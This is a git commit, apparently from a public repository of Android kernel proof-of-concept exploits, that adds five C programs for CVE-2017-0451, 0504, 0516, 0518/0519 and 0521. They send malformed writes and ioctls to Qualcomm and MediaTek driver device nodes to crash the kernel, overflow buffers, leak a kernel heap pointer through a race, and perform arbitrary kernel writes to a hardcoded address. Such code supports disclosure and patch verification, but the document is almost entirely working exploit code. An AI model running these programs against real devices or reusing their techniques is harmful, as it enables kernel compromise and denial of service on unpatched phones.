ScottyBauer__Android_Kernel_CVE_POCs
commit a9e71a13034d283d9bf0fb909039e99285c6db89
Author:     Scott Bauer <sbauer@plzdonthack.me>
AuthorDate: Sat Mar 18 11:58:39 2017 -0600
Commit:     Scott Bauer <sbauer@plzdonthack.me>
CommitDate: Sat Mar 18 11:58:39 2017 -0600

    CVE-2017-0451
    CVE-2017-0504
    CVE-2017-0516
    CVE-2017-0518
    CVE-2017-0519
    CVE-2017-0521
    
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>

diff --git a/CVE-2017-0451.c b/CVE-2017-0451.c
new file mode 100644
index 0000000..6895be8
--- /dev/null
+++ b/CVE-2017-0451.c
@@ -0,0 +1,33 @@
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+#define MSG_REGISTER 0x1
+#define MSG_REQUEST  0x2
+#define MSG_RESPONSE 0x3
+
+struct voice_svc_write_msg {
+        uint32_t msg_type;
+        uint8_t payload[0];
+};
+
+
+int main(void) {
+	int fd;
+	struct voice_svc_write_msg msg = { 0 };
+	msg.msg_type = MSG_REGISTER;
+	msg.payload[0] = 0xff;
+	fd = open("/dev/voice_svc", O_WRONLY);
+	if (fd > 0) {
+		write(fd, &msg, sizeof(msg));
+	}
+	else
+		printf("Error on /dev/voice_svc with %s\n", strerror(errno));
+
+	close(fd);
+ }
+
diff --git a/CVE-2017-0504_mtk.c b/CVE-2017-0504_mtk.c
new file mode 100644
index 0000000..302a649
--- /dev/null
+++ b/CVE-2017-0504_mtk.c
@@ -0,0 +1,61 @@
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <limits.h>
+#include <inttypes.h>
+
+typedef uint8_t u8;
+typedef uint16_t u16;
+
+#pragma pack(1)
+typedef struct {
+        u8 wr;                  /* write read flag 0:R  1:W  2:PID 3: */
+        u8 flag;                /* 0:no need flag/int 1: need flag  2:need int */
+        u8 flag_addr[2];        /* flag address */
+        u8 flag_val;            /* flag val */
+        u8 flag_relation;       /* flag_val:flag 0:not equal 1:equal 2:> 3:< */
+        u16 circle;             /* polling cycle */
+        u8 times;               /* plling times */
+        u8 retry;               /* I2C retry times */
+        u16 delay;              /* delay befor read or after write */
+	u16 data_len;           /* data length */
+        u8 addr_len;            /* address length */
+	u8 addr[2];             /* address */
+	u8 res[3];              /* reserved */
+        u8 *data;               /* data pointer */
+} st_cmd_head;
+#pragma pack()
+
+
+
+int main(int argc, char **argv)
+{
+	st_cmd_head cmd_head = { 0 };
+	int fd;
+
+	if (argc < 2) {
+		printf("Please provide a location to the entry. "\
+		       "it should start with the name 'gmnode' then a date "\
+		       "After.\n");
+		return EXIT_FAILURE;
+	}
+
+	fd = open(argv[1], O_RDWR);
+
+	if (fd < 0) {
+		printf("Couldn't open %s with error %s\n", argv[1], strerror(errno));
+		return EXIT_FAILURE;
+	}
+
+	cmd_head.wr = 15;
+	cmd_head.data_len = 65534;
+
+	write(fd, &cmd_head, sizeof(cmd_head));
+
+	printf("Write completed? Probably should be rebooting now\n");
+	return EXIT_FAILURE;
+}
diff --git a/CVE-2017-0516.c b/CVE-2017-0516.c
new file mode 100644
index 0000000..3b96c83
--- /dev/null
+++ b/CVE-2017-0516.c
@@ -0,0 +1,63 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <stdbool.h>
+#include <errno.h>
+#include <string.h>
+
+static const char *dev = "/dev/hbtp_input";
+
+struct hbtp_input_absinfo {
+	bool     active;
+	uint16_t code;
+	int32_t  minimum;
+	int32_t  maximum;
+};
+
+
+#define HBTP_INPUT_IOCTL_BASE   'T'
+#define HBTP_SET_ABSPARAM       _IOW(HBTP_INPUT_IOCTL_BASE, 201, \
+					     struct hbtp_input_absinfo *)
+
+#define ABS_MT_TOUCH_MAJOR      0x30    /* Major axis of touching ellipse */
+#define ABS_MT_TOUCH_MINOR      0x31    /* Minor axis (omit if circular) */
+#define ABS_MT_TOOL_Y           0x3d    /* Center Y tool position */
+
+#define ABS_MT_FIRST            ABS_MT_TOUCH_MAJOR
+#define ABS_MT_LAST             ABS_MT_TOOL_Y
+
+
+static int getfd(const char* dev_node)
+{
+	int fd;
+	fd = open(dev_node, O_RDWR);
+	if (fd < 0) {
+		fprintf(stderr, "Couldn't open devnode %s with error %s\n", dev_node, strerror(errno));
+		exit(EXIT_FAILURE);
+	}
+
+	return fd;
+}
+
+
+int main(void)
+{
+	int i;
+	struct hbtp_input_absinfo absinfo[ABS_MT_LAST - ABS_MT_FIRST + 1] = { 0 };
+	int fd = getfd(dev);
+
+	for (i = 0; i < ABS_MT_LAST - ABS_MT_FIRST + 1; i++) {
+		absinfo[i].active = 1;
+		absinfo[i].code = 0xFFFF - i;
+		absinfo[i].minimum = 0xAAAAAAAA;
+		absinfo[i].maximum = 0xAAAAAAAA;
+	}
+	
+	while(true) {
+		ioctl(fd, HBTP_SET_ABSPARAM, absinfo);
+	}
+
+}
diff --git a/CVE-2017-0518_0519.c b/CVE-2017-0518_0519.c
new file mode 100644
index 0000000..055c2bd
--- /dev/null
+++ b/CVE-2017-0518_0519.c
@@ -0,0 +1,281 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/types.h>          /* See NOTES */
+#include <sys/socket.h>
+#include <fcntl.h>
+#include <stdbool.h>
+#include <errno.h>
+#include <string.h>
+#include <pthread.h>
+
+static const char *dev = "/dev/qbt1000";
+
+#define QBT1000_SNS_SERVICE_ID          0x138 /* From sns_common_v01.idl */
+#define QBT1000_SNS_SERVICE_VER_ID      1
+#define QBT1000_SNS_INSTANCE_INST_ID    0
+
+#define SNS_QFP_OPEN_RESP_V01 0x0020
+
+#define QMI_REQUEST_CONTROL_FLAG 0x00
+#define QMI_RESPONSE_CONTROL_FLAG 0x02
+#define QMI_INDICATION_CONTROL_FLAG 0x04
+#define QMI_HEADER_SIZE 7
+
+#define OPTIONAL_TLV_TYPE_START 0x10
+
+enum elem_type {
+	QMI_OPT_FLAG = 1,
+	QMI_DATA_LEN,
+	QMI_UNSIGNED_1_BYTE,
+	QMI_UNSIGNED_2_BYTE,
+	QMI_UNSIGNED_4_BYTE,
+	QMI_UNSIGNED_8_BYTE,
+	QMI_SIGNED_2_BYTE_ENUM,
+	QMI_SIGNED_4_BYTE_ENUM,
+	QMI_STRUCT,
+	QMI_STRING,
+	QMI_EOTI,
+};
+
+volatile int cont = 1;
+
+struct qmi_header {
+	unsigned char cntl_flag;
+	uint16_t txn_id;
+	uint16_t msg_id;
+	uint16_t msg_len;
+} __attribute__((__packed__));
+
+struct qseecom_handle {
+	void *dev; /* in/out */
+	unsigned char *sbuf; /* in/out */
+	uint32_t sbuf_len; /* in/out */
+};
+
+enum qbt1000_commands {
+	QBT1000_LOAD_APP = 100,
+	QBT1000_UNLOAD_APP = 101,
+	QBT1000_SEND_TZCMD = 102
+};
+
+struct qbt1000_app {
+	struct qseecom_handle **app_handle;
+	char name[32];
+	uint32_t size;
+	uint8_t high_band_width;
+};
+
+struct qbt1000_send_tz_cmd {
+	struct qseecom_handle *app_handle;
+	uint8_t *req_buf;
+	uint32_t req_buf_len;
+	uint8_t *rsp_buf;
+	uint32_t rsp_buf_len;
+};
+
+struct msm_ipc_port_addr {
+	uint32_t node_id;
+	uint32_t port_id;
+};
+
+struct msm_ipc_port_name {
+	uint32_t service;
+	uint32_t instance;
+};
+
+struct msm_ipc_addr {
+	unsigned char  addrtype;
+	union {
+		struct msm_ipc_port_addr port_addr;
+		struct msm_ipc_port_name port_name;
+	} addr;
+};
+
+
+/*
+ * Socket API
+ */
+
+#define AF_MSM_IPC 27
+
+#define PF_MSM_IPCAF_MSM_IPC
+
+#define MSM_IPC_ADDR_NAME 1
+#define MSM_IPC_ADDR_ID 2
+
+struct sockaddr_msm_ipc {
+	unsigned short family;
+	struct msm_ipc_addr address;
+	unsigned char reserved;
+};
+
+struct qbt1000_app app = { 0 };
+
+static int get_fd(const char* dev_node)
+{
+	int fd;
+	fd = open(dev_node, O_RDWR);
+	if (fd < 0) {
+		fprintf(stderr, "Couldn't open devnode %s with error %s\n", dev_node, strerror(errno));
+		cont = 0;
+		exit(EXIT_FAILURE);
+	}
+
+	return fd;
+}
+
+static void leak_heap_ptr(int fd)
+{
+	void *addr = NULL;
+	app.app_handle = (void *) &addr;
+	app.size = 32;
+	ioctl(fd, QBT1000_LOAD_APP, &app);
+}
+
+static void arb_kernel_write_load_app(int fd)
+{
+	struct qbt1000_app app = { 0 };
+
+	app.app_handle = (void *) 0xABADACCE55013337;
+	ioctl(fd, QBT1000_LOAD_APP, &app);
+}
+
+static void arb_kernel_write_send_tzcmd(int fd)
+{
+	struct qseecom_handle hdl = { 0 };
+	struct qbt1000_send_tz_cmd cmd = { 0 };
+	int x = 0;
+
+	hdl.sbuf = (void *) 0xffffffc0017b1b84;//malloc(4096);//(void *) 0xABADACCE55000000;
+	cmd.app_handle = &hdl;
+	cmd.req_buf = &x; cmd.rsp_buf = NULL;//malloc(4096);
+	cmd.req_buf_len = cmd.rsp_buf_len = 4;
+
+	ioctl(fd, QBT1000_SEND_TZCMD, &cmd);
+}
+
+static void print_msg(char *msg)
+{
+	int i;
+	for (i = 0; i < 4096; i++)
+		printf("%hx ", msg[i]);
+	printf("\n");
+}
+
+
+
+static void recv_msgs(int fd)
+{
+	//ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags);
+	struct msghdr msg = { 0 };
+	struct iovec io = { 0 };
+	struct sockaddr_msm_ipc addr = { 0 };
+	struct msm_ipc_addr address = { 0 };
+	uint8_t *ptr;
+	struct qmi_header *hdr;
+	int count = 1;
+
+	printf("sizeof hdr %zu\n", sizeof(*hdr));
+	//memset(&address, 0, sizeof(address));
+
+	io.iov_base = malloc(4096);
+	memset(io.iov_base, 0, 4096);
+	io.iov_len = 4096;
+
+	msg.msg_iovlen = 1;
+	msg.msg_iov = &io;
+	msg.msg_name = &addr;
+	msg.msg_namelen = sizeof(addr);
+
+	while (cont) {
+		recvmsg(fd, &msg, MSG_CMSG_CLOEXEC);
+		memset(io.iov_base, 0, 128);
+		printf("node_id %u and port_id %u\n",
+		       addr.address.addr.port_addr.node_id,
+		       addr.address.addr.port_addr.port_id);
+		hdr = io.iov_base;
+
+		hdr->cntl_flag = QMI_RESPONSE_CONTROL_FLAG;
+		hdr->txn_id = count++;
+		hdr->msg_id = SNS_QFP_OPEN_RESP_V01;
+		hdr->msg_len = 3;
+		//io.iov_len = sizeof(hdr);
+
+		ptr = io.iov_base + sizeof(*hdr);
+
+		*ptr = OPTIONAL_TLV_TYPE_START;
+		ptr++;
+		*ptr = 0;
+		ptr++;
+		*ptr = 0;
+		//address.addrtype = MSM_IPC_ADDR_ID;
+		sendmsg(fd, &msg, MSG_CMSG_CLOEXEC);
+		//printf("msg %s\n", strerror(errno));
+		//print_msg(io.iov_base);
+	}
+
+}
+
+#define BUILD_INSTANCE_ID(vers, ins) (((vers) & 0xFF) | (((ins) & 0xFF) << 8))
+static void setup_ipc_server(void)
+{
+	int fd;
+	struct sockaddr_msm_ipc addr = { 0 };
+	fd = socket(AF_MSM_IPC, SOCK_DGRAM, 0);
+
+	if (fd < 0) {
+		printf("Couldn't open socket %s\n", strerror(errno));
+		exit(EXIT_FAILURE);
+	}
+
+	addr.family = AF_MSM_IPC;
+	addr.address.addrtype = MSM_IPC_ADDR_NAME;
+	addr.address.addr.port_name.service = QBT1000_SNS_SERVICE_ID;
+	addr.address.addr.port_name.instance =
+		BUILD_INSTANCE_ID(QBT1000_SNS_SERVICE_VER_ID, QBT1000_SNS_INSTANCE_INST_ID);
+
+	bind(fd, (struct sockaddr *) &addr, sizeof(addr));
+	recv_msgs(fd);
+	printf("bind with strerror %s\n", strerror(errno));
+}
+
+static void *leak_ptr(void *ignore)
+{
+	void *save;
+	while(cont) {
+		if (app.app_handle != NULL) {
+			save = *app.app_handle;
+			if (save != NULL) {
+				printf("Leaked ptr is %p\n", save);
+				break;
+			}
+		}
+	}
+
+}
+
+static void *do_ipc_crap(void *ignore)
+{
+	setup_ipc_server();
+}
+
+int main(void)
+{
+	int fd;
+	pthread_t race_car;
+	pthread_t race_car1;
+	pthread_create(&race_car, NULL, do_ipc_crap, NULL);
+	usleep(50000);
+	fd = get_fd(dev);
+	pthread_create(&race_car1, NULL, leak_ptr, NULL);
+	usleep(1000);
+	leak_heap_ptr(fd);
+	/* Comment out below as necessary */
+	//arb_kernel_write_load_app(fd);
+	arb_kernel_write_send_tzcmd(fd);
+
+
+}
diff --git a/CVE-2017-0521.c b/CVE-2017-0521.c
new file mode 100644
index 0000000..16a4c22
--- /dev/null
+++ b/CVE-2017-0521.c
@@ -0,0 +1,432 @@
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <linux/videodev2.h>
+#include <sys/mman.h>
+#include <linux/ion.h>  
+#include <linux/types.h>
+
+/* Should be same as VIDEO_MAX_PLANES in videodev2.h */
+#define MAX_PLANES VIDEO_MAX_PLANES
+/* PARTIAL_FRAME_STRIPE_COUNT must be even */
+#define PARTIAL_FRAME_STRIPE_COUNT 4
+
+#define MAX_NUM_CPP_STRIPS 8
+#define MSM_CPP_MAX_NUM_PLANES 3
+#define MSM_CPP_MIN_FRAME_LENGTH 13
+#define MSM_CPP_MAX_FRAME_LENGTH 4096
+#define MSM_CPP_MAX_FW_NAME_LEN 32
+#define MAX_FREQ_TBL 10
+
+enum msm_cpp_frame_type {
+	MSM_CPP_OFFLINE_FRAME,
+	MSM_CPP_REALTIME_FRAME,
+};
+
+enum msm_vpe_frame_type {
+	MSM_VPE_OFFLINE_FRAME,
+	MSM_VPE_REALTIME_FRAME,
+};
+
+struct msm_cpp_buffer_info_t {
+	int32_t fd;
+	uint32_t index;
+	uint32_t offset;
+	uint8_t native_buff;
+	uint8_t processed_divert;
+	uint32_t identity;
+};
+
+struct msm_cpp_stream_buff_info_t {
+	uint32_t identity;
+	uint32_t num_buffs;
+	struct msm_cpp_buffer_info_t *buffer_info;
+};
+
+enum msm_cpp_batch_mode_t {
+	BATCH_MODE_NONE,
+	BATCH_MODE_VIDEO,
+	BATCH_MODE_PREVIEW
+};
+
+struct msm_cpp_batch_info_t {
+	enum msm_cpp_batch_mode_t  batch_mode;
+	uint32_t batch_size;
+	uint32_t intra_plane_offset[MAX_PLANES];
+	uint32_t pick_preview_idx;
+	uint32_t cont_idx;
+};
+
+struct msm_cpp_frame_info_t {
+	int32_t frame_id;
+	struct timeval timestamp;
+	uint32_t inst_id;
+	uint32_t identity;
+	uint32_t client_id;
+	enum msm_cpp_frame_type frame_type;
+	uint32_t num_strips;
+	uint32_t msg_len;
+	uint32_t *cpp_cmd_msg;
+	int src_fd;
+	int dst_fd;
+	struct timeval in_time, out_time;
+	void __user *cookie;
+	int32_t *status;
+	int32_t duplicate_output;
+	uint32_t duplicate_identity;
+	uint32_t feature_mask;
+	uint8_t we_disable;
+	struct msm_cpp_buffer_info_t input_buffer_info;
+	struct msm_cpp_buffer_info_t output_buffer_info[8];
+	struct msm_cpp_buffer_info_t duplicate_buffer_info;
+	struct msm_cpp_buffer_info_t tnr_scratch_buffer_info[2];
+	uint32_t reserved;
+	uint8_t partial_frame_indicator;
+	/* the followings are used only for partial_frame type
+	 * and is only used for offline frame processing and
+	 * only if payload big enough and need to be split into partial_frame
+	 * if first_payload, kernel acquires output buffer
+	 * first payload must have the last stripe
+	 * buffer addresses from 0 to last_stripe_index are updated.
+	 * kernel updates payload with msg_len and stripe_info
+	 * kernel sends top level, plane level, then only stripes
+	 * starting with first_stripe_index and
+	 * ends with last_stripe_index
+	 * kernel then sends trailing flag at frame done,
+	 * if last payload, kernel queues the output buffer to HAL
+	 */
+	uint8_t first_payload;
+	uint8_t last_payload;
+	uint32_t first_stripe_index;
+	uint32_t last_stripe_index;
+	uint32_t stripe_info_offset;
+	uint32_t stripe_info;
+	struct msm_cpp_batch_info_t  batch_info;
+};
+
+struct msm_cpp_pop_stream_info_t {
+	int32_t frame_id;
+	uint32_t identity;
+};
+
+struct cpp_hw_info {
+	uint32_t cpp_hw_version;
+	uint32_t cpp_hw_caps;
+	unsigned long freq_tbl[MAX_FREQ_TBL];
+	uint32_t freq_tbl_count;
+};
+
+struct msm_vpe_frame_strip_info {
+	uint32_t src_w;
+	uint32_t src_h;
+	uint32_t dst_w;
+	uint32_t dst_h;
+	uint32_t src_x;
+	uint32_t src_y;
+	uint32_t phase_step_x;
+	uint32_t phase_step_y;
+	uint32_t phase_init_x;
+	uint32_t phase_init_y;
+};
+
+struct msm_vpe_buffer_info_t {
+	int32_t fd;
+	uint32_t index;
+	uint32_t offset;
+	uint8_t native_buff;
+	uint8_t processed_divert;
+};
+
+struct msm_vpe_stream_buff_info_t {
+	uint32_t identity;
+	uint32_t num_buffs;
+	struct msm_vpe_buffer_info_t *buffer_info;
+};
+
+struct msm_vpe_frame_info_t {
+	int32_t frame_id;
+	struct timeval timestamp;
+	uint32_t inst_id;
+	uint32_t identity;
+	uint32_t client_id;
+	enum msm_vpe_frame_type frame_type;
+	struct msm_vpe_frame_strip_info strip_info;
+	unsigned long src_fd;
+	unsigned long dst_fd;
+	struct ion_handle *src_ion_handle;
+	struct ion_handle *dest_ion_handle;
+	unsigned long src_phyaddr;
+	unsigned long dest_phyaddr;
+	unsigned long src_chroma_plane_offset;
+	unsigned long dest_chroma_plane_offset;
+	struct timeval in_time, out_time;
+	void *cookie;
+
+	struct msm_vpe_buffer_info_t input_buffer_info;
+	struct msm_vpe_buffer_info_t output_buffer_info;
+};
+
+
+enum msm_camera_buf_mngr_buf_type {
+	MSM_CAMERA_BUF_MNGR_BUF_PLANAR,
+	MSM_CAMERA_BUF_MNGR_BUF_USER,
+	MSM_CAMERA_BUF_MNGR_BUF_INVALID,
+};
+
+#define MSM_CAMERA_MAX_USER_BUFF_CNT 16
+struct msm_camera_user_buf_cont_t {
+	unsigned int buf_cnt;
+	unsigned int buf_idx[MSM_CAMERA_MAX_USER_BUFF_CNT];
+};
+
+struct msm_buf_mngr_info {
+	uint32_t session_id;
+	uint32_t stream_id;
+	uint32_t frame_id;
+	struct timeval timestamp;
+	uint32_t index;
+	uint32_t reserved;
+	enum msm_camera_buf_mngr_buf_type type;
+	struct msm_camera_user_buf_cont_t user_buf;
+};
+
+
+struct msm_pproc_queue_buf_info {
+	struct msm_buf_mngr_info buff_mgr_info;
+	uint8_t is_buf_dirty;
+};
+
+struct msm_cpp_clock_settings_t {
+	unsigned long clock_rate;
+	uint64_t avg;
+	uint64_t inst;
+};
+
+#define VIDIOC_MSM_CPP_CFG \
+	_IOWR('V', BASE_VIDIOC_PRIVATE, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_CPP_GET_EVENTPAYLOAD \
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 1, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_CPP_GET_INST_INFO \
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 2, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_CPP_LOAD_FIRMWARE \
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 3, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_CPP_GET_HW_INFO \
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 4, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_CPP_FLUSH_QUEUE \
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 5, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_CPP_ENQUEUE_STREAM_BUFF_INFO \
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 6, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_CPP_DEQUEUE_STREAM_BUFF_INFO \
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 7, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_VPE_CFG \
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 8, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_VPE_TRANSACTION_SETUP \
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 9, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_VPE_GET_EVENTPAYLOAD \
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 10, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_VPE_GET_INST_INFO \
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 11, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_VPE_ENQUEUE_STREAM_BUFF_INFO \
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 12, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_VPE_DEQUEUE_STREAM_BUFF_INFO \
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 13, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_CPP_QUEUE_BUF \
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 14, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_CPP_APPEND_STREAM_BUFF_INFO \
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 15, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_CPP_SET_CLOCK \
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 16, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_CPP_POP_STREAM_BUFFER \
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 17, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_CPP_IOMMU_ATTACH \
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 18, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_CPP_IOMMU_DETACH \
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 19, struct msm_camera_v4l2_ioctl_t)
+
+#define VIDIOC_MSM_CPP_DELETE_STREAM_BUFF\
+	_IOWR('V', BASE_VIDIOC_PRIVATE + 20, struct msm_camera_v4l2_ioctl_t)
+
+
+#define BASE_VIDIOC_PRIVATE     192             /* 192-255 are private */
+
+#define V4L2_EVENT_CPP_FRAME_DONE  (V4L2_EVENT_PRIVATE_START + 0)
+#define V4L2_EVENT_VPE_FRAME_DONE  (V4L2_EVENT_PRIVATE_START + 1)
+
+struct msm_camera_v4l2_ioctl_t {
+	uint32_t id;
+	size_t len;
+	int32_t trans_code;
+	void __user *ioctl_ptr;
+};
+
+#define MSM_CPP_MSG_ID_TRAILER      0xABCDEFAA
+
+int ion_open()
+{
+    int fd = open("/dev/ion", O_RDONLY);
+    return fd;
+}
+
+static int ion_ioctl(int fd, int req, void *arg)
+{
+    int ret = ioctl(fd, req, arg);
+    return ret;
+}
+
+int ion_alloc(int fd, size_t len, size_t align, unsigned int heap_mask,
+              unsigned int flags, ion_user_handle_t *handle)
+{
+    int ret;
+    struct ion_allocation_data data = {
+        .len = len,
+        .align = align,
+        .heap_id_mask = heap_mask,
+        .flags = flags,
+	//.handle = handle,
+    };
+    if (handle == NULL)
+        return -EINVAL;
+printf("check 1\n");
+    ret = ion_ioctl(fd, ION_IOC_ALLOC, &data);
+    if (ret < 0)
+        return ret;
+printf("check 2\n");
+    *handle = data.handle;
+    
+    return ret;
+}
+
+
+static void ion_get_fd(int fd, ion_user_handle_t *handle, int *buf_fd)
+{
+
+	union {
+		struct ion_fd_data fd;
+		struct ion_allocation_data allocation;
+		struct ion_handle_data handle;
+		struct ion_custom_data custom;
+	} data;
+	memset(&data, 0, sizeof(data));
+	data.handle.handle = *handle;
+	int ret = ioctl(fd, ION_IOC_SHARE, &data);
+	printf("ret is %d with strerror %s\n", ret, strerror(errno));
+	*buf_fd = data.fd.fd;
+	printf("buf_fd = %d\n", *buf_fd);
+}
+
+int main(int argc, char **argv)
+{
+	int fd;
+	int ion_fd;
+	int buf_fd = -1;
+	int ret;
+	const size_t frame_size = 446;
+	ion_user_handle_t ion_handle;
+	uint32_t buf[frame_size];
+	struct msm_camera_v4l2_ioctl_t request = { 0 };
+	struct msm_cpp_frame_info_t frame_info;
+	struct msm_cpp_buffer_info_t buff_info;
+	struct msm_cpp_stream_buff_info_t stream_buff_info;
+
+	memset(&buf, 0x00, sizeof(buf));
+	memset(&frame_info, 0x01, sizeof(frame_info));
+	memset(&buff_info, 0x00, sizeof(buff_info));
+	memset(&stream_buff_info, 0x00, sizeof(stream_buff_info));
+
+	ion_fd = ion_open();
+	if(ion_fd < 0) {
+		printf("Failed to open ion dev, reason: %s\n", strerror(errno));
+		exit(-1);
+	}
+
+	ret = ion_alloc(ion_fd, 0x1000, 0, 0xfffffff,  
+			ION_FLAG_CACHED | ION_FLAG_CACHED_NEEDS_SYNC,  
+			&ion_handle);
+
+	if(ret) {
+		printf("ion_alloc failed, reason: %s\n", strerror(errno));
+		exit(-1);
+	}
+
+	ion_get_fd(ion_fd, &ion_handle, &buf_fd);
+
+/*
+	int32_t fd;
+	uint32_t index;
+	uint32_t offset;
+	uint8_t native_buff;
+	uint8_t processed_divert;
+	uint32_t identity;
+*/
+
+	//buff_info.
+
+	//fd = open("/dev/v4l-subdev12", O_RDWR);
+	char devs[256] = { 0 };
+	//int i;
+	//	for (i = 0; i < 10; i++) {
+		//		v4l-subdev0
+	sprintf(devs, "/dev/v4l-subdev%d", atoi(argv[1]));
+	fd = open(devs, O_RDWR);
+
+	if (fd < 0) {
+		printf("Couldn't open %s, reason: %s\n", devs, strerror(errno));
+		exit(1);
+	}
+	
+	request.len = sizeof(stream_buff_info);
+	request.ioctl_ptr = &stream_buff_info;
+	stream_buff_info.num_buffs = 1;
+	stream_buff_info.identity = 0x27BC86AA;//6666666666
+	stream_buff_info.buffer_info = &buff_info;
+	frame_info.identity = stream_buff_info.identity;
+	buff_info.fd = buf_fd;
+	buff_info.identity = 0x27BC86AA;//66666666660x1234CDEF;
+	buff_info.index = 0;
+	buff_info.native_buff = 1;
+
+	ret = ioctl(fd, VIDIOC_MSM_CPP_ENQUEUE_STREAM_BUFF_INFO, &request);
+	printf("ret done with %d\n", ret);
+
+	ret = ioctl(fd, VIDIOC_MSM_CPP_IOMMU_ATTACH, &request);
+	printf("ret done with %d\n", ret);
+	
+	buf[frame_size - 1] = MSM_CPP_MSG_ID_TRAILER;	
+	frame_info.msg_len = frame_size;
+	frame_info.cpp_cmd_msg = buf;
+	frame_info.num_strips = UINT_MAX;
+	frame_info.we_disable = 1;
+	frame_info.duplicate_output = 0;
+	frame_info.feature_mask = 0;
+	frame_info.input_buffer_info = buff_info;
+
+	request.len = sizeof(frame_info);
+	request.ioctl_ptr = &frame_info;
+	ret = ioctl(fd, VIDIOC_MSM_CPP_CFG, &request);
+	//	}	
+	close(fd);
+}
+
